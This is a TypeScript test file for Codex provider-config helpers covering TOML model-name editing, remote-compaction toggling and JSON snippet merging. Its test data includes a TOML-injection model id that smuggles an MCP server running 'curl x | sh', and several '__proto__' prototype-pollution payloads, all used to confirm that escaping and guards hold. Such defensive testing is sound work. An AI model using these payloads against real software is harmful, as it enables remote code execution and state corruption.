import { afterEach, describe, expect, it } from "vitest";
import {
  codexApiFormatFromWireApi,
  isCodexAnthropicWireApi,
  extractCodexModelName,
  hasCommonConfigSnippet,
  isCodexRemoteCompactionEnabled,
  setCodexModelName,
  setCodexRemoteCompaction,
  updateCommonConfigSnippet,
} from "./providerConfigUtils";

describe("Codex wire API helpers", () => {
  it("recognizes Anthropic Messages aliases", () => {
    expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
    expect(isCodexAnthropicWireApi("anthropic_messages")).toBe(true);
    expect(isCodexAnthropicWireApi("messages")).toBe(true);
    expect(isCodexAnthropicWireApi("claude")).toBe(true);
    expect(isCodexAnthropicWireApi("responses")).toBe(false);
  });

  it("maps every backend-supported Anthropic alias to the form format", () => {
    for (const wireApi of [
      "anthropic",
      "anthropic_messages",
      "anthropic-messages",
      "messages",
      "claude",
    ]) {
      expect(codexApiFormatFromWireApi(wireApi)).toBe("anthropic");
    }
    expect(codexApiFormatFromWireApi("responses")).toBe("openai_responses");
    expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
  });
});

describe("Codex remote compaction config helpers", () => {
  it("enables remote compaction by naming the active custom provider OpenAI", () => {
    const input = `model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"
`;

    const result = setCodexRemoteCompaction(input, true, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
    expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
    expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
  });

  it("disables remote compaction by restoring the provider display name", () => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "OpenAI"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"
`;

    const result = setCodexRemoteCompaction(input, false, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
    expect(result).toContain(`name = "AIHubMix"`);
  });

  it("does not rewrite reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
    expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
  });
});

describe("Codex model name config helpers", () => {
  const input = `# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
`;

  it("extracts the top-level model", () => {
    expect(extractCodexModelName(input)).toBe("gpt-5.5");
  });

  it("ignores model keys inside sections", () => {
    const sectionOnly = `[profiles.fast]
model = "gpt-5.5-mini"
`;
    expect(extractCodexModelName(sectionOnly)).toBeUndefined();
  });

  it("updates the model in place preserving comments", () => {
    const result = setCodexModelName(input, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
    expect(result).toContain("# user comment");
    expect(result).toContain(`model_reasoning_effort = "high"`);
    expect(result).not.toContain("gpt-5.5");
  });

  it("inserts a model line when absent", () => {
    const withoutModel = `model_provider = "custom"

[model_providers.custom]
name = "Example"
`;
    const result = setCodexModelName(withoutModel, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("removes the top-level model line when cleared", () => {
    const result = setCodexModelName(input, "");
    expect(extractCodexModelName(result)).toBeUndefined();
    expect(result).toContain(`model_provider = "custom"`);
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    // The /models dropdown id comes from a remote response; a newline
    // injection would become an independent TOML line if not escaped
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const result = setCodexModelName(input, hostile);

    expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(result).not.toMatch(/^command = /m);
    expect(result).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("escapes backslashes in model names", () => {
    const result = setCodexModelName(input, "vendor\\model");
    expect(result).toContain('model = "vendor\\\\model"');
  });

  it("round-trips names containing quotes and backslashes", () => {
    const name = 'a"b\\c';
    const written = setCodexModelName(input, name);
    expect(extractCodexModelName(written)).toBe(name);
  });

  it("replaces an escaped existing model line instead of duplicating it", () => {
    const written = setCodexModelName(input, 'evil"name');
    const result = setCodexModelName(written, "gpt-5.6");
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("replaces empty-string and single-quoted model lines", () => {
    const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
    expect(extractCodexModelName(emptyModel)).toBe("");
    const replaced = setCodexModelName(emptyModel, "gpt-5.6");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");

    const singleQuoted = `model = 'kimi-k2.7'\n`;
    expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
  });
});

describe("common config snippet prototype-pollution guards", () => {
  // Pollution is global: once it leaks into Object.prototype, later cases in
  // this file will read the ghost property and the failure surfaces on an
  // unrelated assertion. Force cleanup after every case.
  afterEach(() => {
    delete (Object.prototype as Record<string, unknown>).polluted;
  });

  it("does not let a merged snippet reach Object.prototype", () => {
    // `JSON.parse` turns `__proto__` into an **own enumerable property**,
    // so it does reach `Object.entries`; and `isPlainObject(Object.prototype)`
    // is true, so the old code skipped the "replace with an empty object"
    // branch and merged the value straight into the global prototype.
    const snippet = JSON.stringify({
      env: { SHARED_TIMEOUT_MS: "1000" },
      ["__proto__"]: { polluted: "YES" },
    });

    const result = updateCommonConfigSnippet("{}", snippet, true);

    expect(result.error).toBeUndefined();
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    // Ordinary keys must still merge in as before — the guard must not eat shareable config along the way.
    expect(JSON.parse(result.updatedConfig).env.SHARED_TIMEOUT_MS).toBe("1000");
  });

  it("does not report a __proto__-only snippet as already applied", () => {
    // isSubset is the third traversal function in this group; it only reads,
    // so it can't pollute the prototype — but without the skip it would
    // compare against `Object.prototype`: every key of `{"__proto__":{}}`
    // "exists" on any object, so it gets judged a subset of **any** config,
    // and the "common config enabled" toggle reads wrong as a result.
    expect(hasCommonConfigSnippet("{}", '{"__proto__":{}}')).toBe(false);
    expect(
      hasCommonConfigSnippet('{"env":{"A":"1"}}', '{"__proto__":{"x":1}}'),
    ).toBe(false);
  });

  it("keeps merge and applied-state consistent for a mixed snippet", () => {
    // A mixed snippet is where the three traversal functions' semantics used
    // to diverge: deepMerge skips the forbidden key and keeps writing env.A,
    // while isSubset rejects outright as soon as it sees the forbidden key —
    // so the snippet was actually applied, yet the toggle would forever show
    // "disabled". Now that sanitizing happens uniformly at the entry point,
    // this discrepancy is structurally impossible.
    const snippet = JSON.stringify({
      env: { A: "1" },
      ["__proto__"]: { polluted: "YES" },
    });

    const merged = updateCommonConfigSnippet("{}", snippet, true).updatedConfig;
    expect(JSON.parse(merged).env.A).toBe("1");
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();

    // Once it's actually written, it must report "enabled"
    expect(hasCommonConfigSnippet(merged, snippet)).toBe(true);
  });

  it("still reports a genuinely applied snippet as applied", () => {
    // The guard must not break the normal, legitimate case in the process
    expect(
      hasCommonConfigSnippet('{"env":{"A":"1","B":"2"}}', '{"env":{"A":"1"}}'),
    ).toBe(true);
    expect(
      hasCommonConfigSnippet('{"env":{"A":"1"}}', '{"env":{"A":"9"}}'),
    ).toBe(false);
  });

  it("does not let an un-merged snippet delete from Object.prototype", () => {
    // deepRemove's side is sneakier: `"__proto__" in target` is always true
    // (`in` walks the prototype chain), so the old code would recurse into
    // Object.prototype and `delete` whatever key it matched.
    (Object.prototype as Record<string, unknown>).polluted = "YES";

    const snippet = JSON.stringify({ ["__proto__"]: { polluted: "YES" } });
    const result = updateCommonConfigSnippet("{}", snippet, false);

    expect(result.error).toBeUndefined();
    expect(({} as Record<string, unknown>).polluted).toBe("YES");
  });
});
